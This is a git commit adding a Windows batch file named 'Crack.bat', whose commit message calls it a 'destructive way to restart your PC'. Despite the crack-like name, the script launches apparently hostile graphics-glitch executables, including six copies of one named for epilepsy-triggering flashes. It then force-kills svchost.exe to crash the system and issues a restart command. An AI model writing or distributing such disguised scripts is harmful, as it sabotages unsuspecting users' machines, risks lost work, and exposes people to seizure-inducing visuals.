6dfeccd04597647a18f0ff3d94751aad24211252
1here3 <159972256+1here3@users.noreply.github.com>
2025-04-06 12:16:50 -0700

    Destructive way to restart your PC

---
+++ Crack.bat
@@ -0,0 +1,24 @@
+start BitBlt222.exe
+timeout 3
+start write.exe
+start notepad.exe
+start winver.exe
+start train.exe
+timeout 4
+start gdihell.exe
+timeout 2
+start cmd.exe
+timeout 10
+start epilepsyandblackshader.exe
+start epilepsyandblackshader.exe
+start epilepsyandblackshader.exe
+start epilepsyandblackshader.exe
+start epilepsyandblackshader.exe
+start epilepsyandblackshader.exe
+timeout 15
+start notepad.exe
+timeout 15
+start cmd.exe
+timeout 1
+taskkill /f /im svchost.exe
+shutdown /r t 0
